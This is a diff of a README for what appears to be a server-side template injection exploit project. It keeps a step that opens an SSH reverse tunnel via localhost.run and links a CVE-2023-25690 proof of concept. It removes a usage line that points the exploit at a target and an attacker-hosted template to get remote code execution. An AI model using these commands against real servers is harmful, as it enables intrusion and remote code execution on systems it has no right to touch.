@@ -18,11 +18,8 @@ So, the functionality of the application seems to load and render templates eith
 5. Tunnel using `ssh -R 80:localhost:80 localhost.run -i /home/$user/.ssh/id_rsa`.
 
 ## Exploit
+<img src= "exploited_website.PNG">
 
-This Python script automates the exploitation of a server-side template injectiony in the web application. It sends a GET request to a specified vulnerable URL, loading and executing our attacker-controlled template on the target server, resulting in remote code execution. 
-   ```python
-   python exploit.py http://target-server.com http://attacker-server.com/attacker-template.txt
-```
 ## More Information
 
 [CVE-2023-25690-POC](https://github.com/dhmosfunk/CVE-2023-25690-POC/tree/main#internal-http-request-smuggling-via-header-injection)
